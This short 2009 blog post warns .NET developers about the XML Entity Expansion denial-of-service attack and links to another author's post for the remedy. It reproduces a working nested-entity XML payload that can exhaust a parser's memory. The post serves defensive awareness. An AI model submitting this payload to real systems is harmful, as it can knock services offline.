---
title:	"Protecting against XML Entity Expansion attacks"
date:	2009-05-23
author: Steven van Deursen
tags:   [.NET General, Security]
draft:	false
---

### Tom Hollander describes on his blog a denial of service attack I never knew the existence of, called XML Entity Expansion attack. Tom explains how to bring a server to its knees when allowing any type of xml document as input and passing it directly to an XmlDocument for parsing.

Tom uses the following XML document of less than 1 KB to demonstrate the attack:

{{< highlight xml >}}
<!DOCTYPE foo [ 
<!ENTITY a "1234567890" > 
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;" > 
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;" > 
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;" > 
<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;" > 
<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;" > 
<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;" > 
<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;" > 
<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;" > 
<!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;" > 
<!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;" > 
<!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;" > 
<!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;" > 
]> 
<foo>&m;</foo>
{{< / highlight >}}

See [his post](https://blogs.msdn.com/tomholl/archive/2009/05/21/protecting-against-xml-entity-expansion-attacks.aspx) for more information and the proposed remedy.

## Comments